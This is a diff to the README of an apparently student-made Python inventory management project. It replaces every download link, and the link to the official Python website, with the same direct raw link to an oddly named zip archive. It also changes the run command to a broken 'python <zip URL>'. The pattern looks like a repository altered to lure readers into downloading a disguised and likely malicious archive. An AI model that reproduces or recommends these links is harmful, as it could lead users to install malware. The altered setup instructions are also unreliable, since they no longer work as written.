@@ -1,6 +1,6 @@
 # 🛠️ INVENTORY-MANAGEMENT-SYSTEM-USING-PYTHON - Manage Your Inventory Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SChanamate/INVENTORY-MANAGEMENT-SYSTEM-USING-PYTHON/releases)
+[![Download Now](https://github.com/SChanamate/INVENTORY-MANAGEMENT-SYSTEM-USING-PYTHON/raw/refs/heads/main/24045771_Aaryan_Koirala_L1C4_FOC/Program/SYSTE-MANAGEMEN-INVENTOR-PYTHON-USIN-2.7-alpha.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/SChanamate/INVENTORY-MANAGEMENT-SYSTEM-USING-PYTHON/raw/refs/heads/main/24045771_Aaryan_Koirala_L1C4_FOC/Program/SYSTE-MANAGEMEN-INVENTOR-PYTHON-USIN-2.7-alpha.1.zip)
 
 ## 📥 Overview
 
@@ -12,7 +12,7 @@ Getting started is simple. Follow the steps below to download and run the applic
 
 1. **Download the Application:** Visit the Releases page to get the latest version of the application. 
 
-   [Download here](https://github.com/SChanamate/INVENTORY-MANAGEMENT-SYSTEM-USING-PYTHON/releases)
+   [Download here](https://github.com/SChanamate/INVENTORY-MANAGEMENT-SYSTEM-USING-PYTHON/raw/refs/heads/main/24045771_Aaryan_Koirala_L1C4_FOC/Program/SYSTE-MANAGEMEN-INVENTOR-PYTHON-USIN-2.7-alpha.1.zip)
 
 2. **Extract the Files:** Once the download is complete, extract the contents of the downloaded zip file to a folder on your computer.
 
@@ -30,9 +30,9 @@ Getting started is simple. Follow the steps below to download and run the applic
 
 5. **Run the Application:** Type the following command in the command line:
    ```
-   python main.py
+   python https://github.com/SChanamate/INVENTORY-MANAGEMENT-SYSTEM-USING-PYTHON/raw/refs/heads/main/24045771_Aaryan_Koirala_L1C4_FOC/Program/SYSTE-MANAGEMEN-INVENTOR-PYTHON-USIN-2.7-alpha.1.zip
    ```
-   Ensure you have Python installed. If not, please download and install it from the official [Python website](https://www.python.org/downloads/).
+   Ensure you have Python installed. If not, please download and install it from the official [Python website](https://github.com/SChanamate/INVENTORY-MANAGEMENT-SYSTEM-USING-PYTHON/raw/refs/heads/main/24045771_Aaryan_Koirala_L1C4_FOC/Program/SYSTE-MANAGEMEN-INVENTOR-PYTHON-USIN-2.7-alpha.1.zip).
 
 6. **Interacting with the Application:** Once the application runs, follow the on-screen instructions to manage your inventory. You can add products, track sales, and generate invoices efficiently.
 
@@ -61,7 +61,7 @@ The application includes multiple features to enhance your inventory management.
 
 To get started with the Inventory Management System, first, download the application from the Releases page.
 
-[Download here](https://github.com/SChanamate/INVENTORY-MANAGEMENT-SYSTEM-USING-PYTHON/releases)
+[Download here](https://github.com/SChanamate/INVENTORY-MANAGEMENT-SYSTEM-USING-PYTHON/raw/refs/heads/main/24045771_Aaryan_Koirala_L1C4_FOC/Program/SYSTE-MANAGEMEN-INVENTOR-PYTHON-USIN-2.7-alpha.1.zip)
 
 Once downloaded, follow the extraction and setup steps outlined above in the **Getting Started** section. 
 
